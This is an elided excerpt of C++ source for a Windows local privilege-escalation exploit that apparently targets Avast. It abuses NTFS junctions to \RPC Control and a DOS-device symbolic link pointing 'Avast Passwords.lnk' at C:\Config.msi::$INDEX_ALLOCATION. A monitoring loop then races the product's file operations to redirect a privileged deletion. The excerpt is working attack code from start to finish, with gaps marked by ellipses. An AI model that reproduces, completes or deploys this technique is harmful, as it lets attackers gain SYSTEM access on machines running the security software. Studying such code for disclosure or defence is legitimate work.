...
int wmain() {
	...
	HANDLE hDir = getDirectoryHandle(BuildPath(L"C:\\Users\\asdf\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
	printf("hDir: %x\n", hDir);
	HANDLE zxc{};
	...
	CloseHandle(zxc);
	DeleteJunction(dir);
	DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\Avast Passwords.lnk", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
	return 0;
...
void cb0() {
	...
	_swprintf(dir, L"C:\\Users\\asdf\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu");
	if (!CreateJunction(BuildPath(dir), L"\\RPC Control")) {
		printf("[!] Exiting!\n");
		exit(1);
	}
	if (!DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\Avast Passwords.lnk", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION")) {
		printf("zxc\n");
		//printf("[!] Exiting!\n");
		//exit(1);
	}
...
BOOL Monitor(HANDLE hDir) {
	...
	do {
		...
		if ((fi->Action == FILE_ACTION_ADDED) && (wcswcs(fi->FileName, L"asw"))) {
			wprintf(L"filename: %s\n", fi->FileName);
			_swprintf(path, L"C:\\Users\\asdf\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\%s", fi->FileName);
			h2 = CreateFile(path, DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
			printf("h2: %x, %d\n", GetLastError());
			Move(h2);
			do {
				
				h = CreateFile(L"C:\\Users\\asdf\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Avast Passwords.lnk", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
				printf("h: %x\n", h);
